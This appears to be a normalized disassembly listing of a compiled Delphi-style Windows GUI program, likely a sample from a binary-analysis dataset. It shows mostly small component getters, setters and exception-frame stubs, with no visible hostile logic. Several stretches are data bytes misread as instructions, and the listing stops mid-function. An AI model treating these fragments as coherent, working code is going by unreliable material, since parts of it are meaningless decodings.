sub_44d4ba
out dx eax
push edx
push ecx
[ esp + ebx * 8 + 0x44 ]
sub_44db60
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_4161fc
retn
sub_44db78
mov al 0x1
retn
sub_44db7c
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41e5d4
retn
mov eax edx
retn
sub_44db8c
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41e5a4
retn
mov al 0x1
retn
sub_44de7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4161a0
pop esi
pop ebx
retn
sub_44de90
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44decc
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44e118
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e12c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e140
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e154
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e168
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e17c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e190
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e1a4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e1b8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e1cc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40384c
pop ebx
retn
sub_44e1e0
retn
sub_44e1e4
retn
sub_44e1e8
retn
sub_44e1ec
retn
sub_44e1f0
retn
sub_44e1f4
retn
sub_44e1f8
retn
sub_44e1fc
retn
sub_44e200
retn
sub_44e204
retn
sub_44e208
retn
sub_44e20c
retn
sub_44e4b8
jmp sub_403e54
sub_44e83c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x90 ] eax
sub_44e8bc
push esi
mov si 0xffef
call sub_4038bc
pop esi
retn
sub_44e95d
jmp sub_403e54
sub_44e964
pop ebp
retn
sub_44e968
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
sub_44eb88
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44ed61
jmp sub_403e54
sub_44ed68
pop ebx
pop ecx
pop ebp
retn
sub_44ed74
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44efdc
sub_44ee21
jmp sub_403e54
sub_44ee28
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44ef30
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44f06b
jmp sub_403e54
sub_44f072
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f10a
jmp sub_403e54
sub_44f111
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f12e
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_44f127
jmp sub_403e54
sub_44f12e
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4038bc
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f205
jmp sub_403e54
sub_44f243
jmp sub_403e54
sub_44f24a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4038bc
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f40f
jmp sub_403e54
sub_44f416
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f433
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_44f42c
jmp sub_403e54
sub_44f433
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44f4ac
retn
sub_44f44c
jmp sub_403e54
sub_44f49b
jmp sub_403e54
sub_44f4a2
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f52b
jmp sub_403e54
sub_44f532
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f538
or edx 0xffffffff
call sub_44f4ac
retn
sub_44f936
jmp sub_403e54
sub_44f93d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f95a
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_44f953
jmp sub_403e54
sub_44f95a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f977
mov eax [ ebp - 0x4 ]
call sub_450268
retn
sub_44f970
jmp sub_403e54
sub_44f977
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fb7c
jmp sub_403e54
sub_44fb83
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fb88
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4038bc
sub_44fba0
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_414b3c
pop ebx
retn
sub_44fc44
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_416044
sub_44fd5f
jmp sub_403e54
sub_44fd66
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_44fd7c
jmp sub_403e54
sub_45008e
jmp sub_403e54
sub_450095
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500b2
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
sub_4500ab
jmp sub_403e54
sub_4500b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500cf
mov eax [ ebp - 0x8 ]
call sub_4036c0
retn
sub_4500c8
jmp sub_403e54
sub_4500cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450151
jmp sub_403e54
sub_450158
pop ebx
pop ecx
pop ebp
retn
sub_450259
jmp sub_403e54
sub_450260
pop ebx
pop ecx
pop ebp
retn
sub_450264
inc [ eax + 0x5c ]
retn
sub_450268
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4038bc
sub_4502bc
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_4502f9
jmp sub_403e54
sub_450300
pop ebp
retn
sub_450304
sub [ rw-data ] 0x1
retn
sub_4505d4
xor al 0xea
inc ecx
add ah bl
sbb [ ebp ] eax
mov dl ch
inc ecx
add [ ebx + ebx ] ah
inc ebp
add [ eax + 0x4c0041e9 ] bh
0xeac00041 0x41
sub_4511d3
jmp [ eax + eax ]
sub_451230
mov eax [ esp + 0x8 ]
retn
sub_451238
push ebx
mov ebx eax
call sub_451230
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
jmp sub_403e8c
sub_451254
pop ebx
retn
sub_4514cd
jmp sub_403e54
sub_4514d4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45161f
jmp sub_403e54
sub_451626
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45163c
push ebx
mov eax [ rw-data ]
call sub_4169e0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41699c
mov eax ebx
pop ebx
retn
sub_4517c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4517e0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_451edb
jmp sub_403e54
sub_451ee2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451fda
jmp sub_403e54
sub_451fe1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4523f8
jmp sub_403e54
sub_4523ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_452836
jmp sub_403e54
sub_452cbc
jmp sub_403e54
sub_452cc3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4530b3
jmp sub_403e54
sub_45355e
jmp sub_403e54
sub_453565
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4538f2
jmp sub_403e54
sub_4538f9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_453907
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453ab4
mov eax [ r-xdata ]
retn
sub_453af0
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453b04
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453b14
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453b24
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_453e20
mov edx eax
sub_453bbc
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403870
mov edx esi
call sub_453b3c
pop esi
pop ebx
retn
sub_453c38
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_453e20
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4161fc
mov ecx eax
sub_454010
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_454078
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_454420
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_454454
sub_454454
mov edx sub_45442c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_4516bc
retn
sub_45463e
jmp sub_403e54
sub_454645
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454adc
jmp sub_403e54
sub_454b1b
jmp sub_403e54
sub_454b22
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454cc0
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454dfc
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4038bc
pop esi
pop ebp
retn 0x8
sub_454e18
mov eax [ eax + 0x34 ]
call sub_452184
retn
sub_454e24
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4038bc
pop esi
retn
sub_454e60
push ebx
mov ecx sub_454e38
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4516bc
pop ebx
retn
sub_455094
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4550a8
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_4551dd
jmp sub_403ba0
sub_4552df
jmp sub_403e54
sub_45530a
jmp sub_403e54
sub_455311
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_455328
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_455510
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_454e60
sub_455590
jmp sub_403e54
sub_4555d4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4555ec
push ebx
mov ebx eax
mov eax ebx
call sub_41e5f4
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45563e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_454e60
sub_4556b4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4557fd
jmp sub_403e54
sub_455804
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_455a44
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_455a54
sub_455aa8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_455ab8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_455ac8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_455ad8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_455ae8
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_455b60
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_451fe8
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_451fe8
retn
sub_455b7c
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_451fe8
sub_455bc4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_454e18
retn
mov eax edx
retn
sub_455bfe
jmp sub_403ba0
sub_455c03
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455f69
jmp sub_403e54
sub_455f70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
sub_455f86
jmp sub_403e54
sub_456087
jmp sub_403e54
sub_45608e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4560ab
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
sub_4560a4
jmp sub_403e54
sub_4560c9
jmp sub_403e54
sub_456153
jmp sub_403e54
sub_45615a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45618c
push ebx
mov ebx eax
mov eax ebx
call sub_416340
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41f398
sub_456250
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_456264
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45626c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_456635
jmp sub_403e54
sub_45663c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45673c
jmp sub_403e54
sub_456743
pop ebp
retn
sub_457b8f
[ edi + edi * 8 - 0x2f002f ]
sub_457b96
stc
jmp esp
sub_458e04
mov eax [ rw-data ]
retn
sub_458e0c
mov [ rw-data ] eax
retn
sub_458f54
jmp sub_403ba0
sub_458f8b
jmp sub_403e54
sub_458f92
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45923c
push ebx
add esp 0xffffff00
push esp
call GetKeyboardState
mov eax esp
call sub_4591f0
mov ebx eax
mov eax ebx
add esp 0x100
pop ebx
retn
sub_4592ba
jmp sub_403e54
sub_4592c1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459365
jmp sub_403e54
sub_45936c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4593fc
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_459b28
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a1b0
sub_459b44
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0x80000014
call sub_459b28
sub_459c64
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a1b0
sub_459c7c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45a1b0
sub_459c94
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45a1b0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_459cc0
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_459ccc
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45a1b0
retn
sub_459f9c
push ebx
mov ebx edx
mov edx ebx
call sub_4453e0
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_459ff8
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_45a120
jmp sub_403e54
sub_45a127
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a130
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_459560
mov eax [ ebx + 0x20c ]
call sub_459560
sub_45a190
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45a1a0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45a29b
jmp sub_403e54
sub_45a2a8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45a2c0
sub_45a4dc
retn
sub_45a54a
jmp sub_403e54
sub_45a589
jmp sub_403e54
sub_45a5bc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4468a8
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_4597ec
retn
sub_45a5e0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4468c8
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_4597ec
retn
sub_45a6d5
jmp sub_403e54
sub_45a6dc
mov eax [ ebp - 0x4 ]
call sub_448788
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_459454
mov eax [ ebp - 0x4 ]
call sub_45a1b0
sub_45a7b4
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_445ac0
sub_45a7c8
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
sub_45a914
jmp sub_403e54
sub_45a94c
jmp sub_403e54
sub_45a953
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a973
lea eax [ ebp - 0x114 ]
call sub_40442c
retn
sub_45a96c
jmp sub_403e54
sub_45a973
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_45ac6e
jmp sub_403e54
sub_45ac75
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403a74
sub_45acc9
jmp sub_403ba0
sub_45ad45
jmp sub_403ba0
sub_45ad4a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_461f40
call sub_403f08
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b102
jmp sub_403e54
sub_45b109
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b1e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a7f8
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45b1fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b234
mov edx eax
mov eax esi
call sub_41c940
pop esi
pop ebx
retn
sub_45b218
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c50c
mov edx eax
mov eax esi
call sub_41c940
pop esi
pop ebx
retn
sub_45b234
push ebx
mov ebx eax
mov eax ebx
call sub_45c1ac
mov edx r-xdata
call sub_422364
pop ebx
retn
sub_45b338
push ebx
mov ebx eax
mov eax ebx
call sub_45b348
xor al 0x1
pop ebx
retn
sub_45b348
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45b3a4
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45b3c4
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45b3e4
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45b6dd
jmp sub_403e54
sub_45b6e4
pop ecx
pop ebp
retn
sub_45b6e8
xor eax eax
retn
sub_45b9bd
jmp sub_403e54
sub_45b9c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_45b9da
jmp sub_403e54
sub_45bac4
jmp sub_403e54
sub_45bacb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bae8
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_45bae1
jmp sub_403e54
sub_45bb08
jmp sub_403e54
sub_45bd59
jmp sub_403e54
sub_45bebd
jmp sub_403e54
sub_45c1ac
mov eax [ eax + 0x238 ]
retn
sub_45c1b4
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45c1c0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45c4fe
jmp sub_403e54
sub_45c505
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c50c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45c554
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_445ac0
sub_45c570
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45c5ac
push ebx
mov ebx eax
mov eax ebx
call sub_447a04
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_421ce0
sub_45c630
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_422408
sub_45c650
push ebx
mov ebx eax
mov eax ebx
call sub_45c270
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45c338
pop ebx
retn
sub_45ce79
lea eax [ ebp - 0xb4 ]
call sub_40442c
retn
sub_45ce85
jmp sub_403e54
j_sub_45ce79
jmp sub_45ce79
sub_45ce8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cfe4
jmp sub_403e54
sub_45cfeb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d2d0
jmp sub_403e54
sub_45d2d7
mov eax [ rw-data ]
call sub_45fae0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d2ee
add [ eax ] al
retn
sub_45d54c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45d56c
mov eax [ eax + 0x240 ]
call sub_4281f8
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4617f0
sub_45d613
jmp sub_403e54
sub_45d61a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d63d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4223e0
retn
sub_45d636
jmp sub_403e54
sub_45d63d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d7fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45d56c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45da64
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_454fcc
sub_45db4f
jmp sub_403e54
sub_45db56
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45db5c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45d344
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45dbb4
call sub_45e89c
retn
sub_45e00c
jmp sub_403e54
sub_45e013
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e113
jmp sub_403e54
sub_45e11a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e2c4
jmp sub_403ba0
sub_45e660
jmp sub_403ba0
sub_45e759
jmp sub_403e54
sub_45e760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e77d
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
sub_45e776
jmp sub_403e54
sub_45e77d
pop edi
pop esi
pop ebx
pop ecx
